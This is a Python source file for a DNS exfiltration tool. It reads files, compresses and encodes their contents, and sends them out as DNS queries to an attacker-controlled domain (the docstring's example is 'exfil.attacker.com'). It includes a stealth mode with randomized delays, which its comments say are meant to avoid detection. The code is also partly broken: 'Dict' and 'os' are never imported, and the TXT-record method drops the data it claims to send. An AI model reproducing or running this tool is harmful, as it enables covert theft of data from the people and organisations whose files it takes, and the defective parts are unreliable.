"""
DNS Exfiltration
Exfiltrate data through DNS queries
"""

import base64
import socket
import random
import string
import time
from typing import List, Optional
import zlib
import dns.resolver
import dns.message
import dns.query

class DNSExfiltrator:
    """
    Exfiltrates data via DNS queries
    """
    
    def __init__(self, domain: str, dns_server: Optional[str] = None):
        """
        Initialize DNS exfiltrator
        
        Args:
            domain: Domain name under your control (e.g., "exfil.attacker.com")
            dns_server: Custom DNS server to query (optional)
        """
        self.domain = domain
        self.dns_server = dns_server or '8.8.8.8'
        self.max_label_length = 63  # DNS label length limit
        self.max_name_length = 253  # Total DNS name length limit
        
    def exfiltrate_data(self, data: bytes, session_id: str = None, 
                       compress: bool = True) -> int:
        """
        Exfiltrate data via DNS queries
        
        Returns: Number of queries sent
        """
        if not session_id:
            session_id = self._generate_session_id()
        
        print(f"[*] Starting DNS exfiltration (Session: {session_id})")
        
        # Compress data if requested
        if compress:
            original_size = len(data)
            data = zlib.compress(data)
            compressed_size = len(data)
            print(f"[*] Compressed {original_size} bytes to {compressed_size} bytes")
        
        # Encode data
        encoded = base64.b32encode(data).decode('ascii').upper()
        
        # Split into chunks
        chunks = self._split_into_chunks(encoded)
        
        print(f"[*] Split into {len(chunks)} DNS queries")
        
        # Send chunks
        query_count = 0
        for i, chunk in enumerate(chunks):
            try:
                # Construct DNS query
                # Format: {chunk}.{seq}.{session}.{domain}
                query = f"{chunk}.{i:04x}.{session_id}.{self.domain}"
                
                # Send query
                self._send_dns_query(query)
                
                query_count += 1
                
                # Small delay to avoid detection
                time.sleep(random.uniform(0.1, 0.5))
                
            except Exception as e:
                print(f"[!] Error sending query {i}: {str(e)}")
        
        # Send completion marker
        completion_query = f"END.{len(chunks):04x}.{session_id}.{self.domain}"
        self._send_dns_query(completion_query)
        
        print(f"[+] Exfiltration complete: {query_count} queries sent")
        
        return query_count
    
    def exfiltrate_file(self, filepath: str, compress: bool = True) -> int:
        """
        Exfiltrate a file via DNS
        """
        print(f"[*] Exfiltrating file: {filepath}")
        
        with open(filepath, 'rb') as f:
            data = f.read()
        
        return self.exfiltrate_data(data, compress=compress)
    
    def _split_into_chunks(self, encoded_data: str) -> List[str]:
        """
        Split encoded data into DNS-friendly chunks
        """
        # Calculate usable space per query
        # Reserve space for sequence number, session ID, and dots
        reserved = len(".0000..") + len(self.domain) + 8  # 8 for session ID
        max_chunk_size = self.max_name_length - reserved
        
        # Further limit by label length
        if max_chunk_size > self.max_label_length:
            max_chunk_size = self.max_label_length
        
        chunks = []
        for i in range(0, len(encoded_data), max_chunk_size):
            chunks.append(encoded_data[i:i + max_chunk_size])
        
        return chunks
    
    def _send_dns_query(self, query: str):
        """
        Send DNS query
        """
        try:
            # Use dnspython for more control
            request = dns.message.make_query(query, dns.rdatatype.A)
            response = dns.query.udp(request, self.dns_server, timeout=2)
            
        except Exception as e:
            # Fallback to socket
            try:
                socket.gethostbyname(query)
            except:
                pass  # Query failed but that's okay for exfil
    
    def _generate_session_id(self) -> str:
        """
        Generate unique session ID
        """
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    
    def exfiltrate_with_txt_records(self, data: bytes, session_id: str = None) -> int:
        """
        Exfiltrate using TXT record queries (can hold more data)
        """
        if not session_id:
            session_id = self._generate_session_id()
        
        print(f"[*] DNS TXT exfiltration (Session: {session_id})")
        
        # Encode data
        encoded = base64.b64encode(data).decode('ascii')
        
        # TXT records can be longer
        max_chunk = 200  # Conservative limit
        chunks = [encoded[i:i+max_chunk] for i in range(0, len(encoded), max_chunk)]
        
        query_count = 0
        for i, chunk in enumerate(chunks):
            try:
                query = f"txt.{i:04x}.{session_id}.{self.domain}"
                
                # Query TXT record
                request = dns.message.make_query(query, dns.rdatatype.TXT)
                dns.query.udp(request, self.dns_server, timeout=2)
                
                query_count += 1
                time.sleep(random.uniform(0.1, 0.5))
                
            except Exception as e:
                pass
        
        print(f"[+] TXT exfiltration complete: {query_count} queries")
        
        return query_count
    
    def exfiltrate_stealth_mode(self, data: bytes, delay_range: tuple = (5, 30)) -> int:
        """
        Slow, stealthy exfiltration with randomized delays
        """
        session_id = self._generate_session_id()
        
        print(f"[*] Stealth DNS exfiltration (delays: {delay_range}s)")
        
        # Compress aggressively
        compressed = zlib.compress(data, level=9)
        encoded = base64.b32encode(compressed).decode('ascii').upper()
        chunks = self._split_into_chunks(encoded)
        
        query_count = 0
        start_time = time.time()
        
        for i, chunk in enumerate(chunks):
            try:
                query = f"{chunk}.{i:04x}.{session_id}.{self.domain}"
                self._send_dns_query(query)
                
                query_count += 1
                
                # Random delay between queries
                if i < len(chunks) - 1:  # Don't delay after last chunk
                    delay = random.uniform(*delay_range)
                    print(f"[*] Query {i+1}/{len(chunks)} sent, waiting {delay:.1f}s...")
                    time.sleep(delay)
                
            except Exception as e:
                print(f"[!] Error on query {i}: {str(e)}")
        
        elapsed = time.time() - start_time
        print(f"[+] Stealth exfiltration complete in {elapsed:.1f}s")
        
        return query_count
    
    def benchmark_exfiltration(self, data_size: int = 1024) -> Dict:
        """
        Benchmark DNS exfiltration performance
        """
        import time
        
        # Generate test data
        test_data = os.urandom(data_size)
        
        results = {}
        
        # Test uncompressed
        start = time.time()
        queries = self.exfiltrate_data(test_data, compress=False)
        elapsed = time.time() - start
        
        results['uncompressed'] = {
            'size': data_size,
            'queries': queries,
            'time': elapsed,
            'bytes_per_second': data_size / elapsed
        }
        
        # Test compressed
        start = time.time()
        queries = self.exfiltrate_data(test_data, compress=True)
        elapsed = time.time() - start
        
        results['compressed'] = {
            'size': data_size,
            'queries': queries,
            'time': elapsed,
            'bytes_per_second': data_size / elapsed
        }
        
        return results
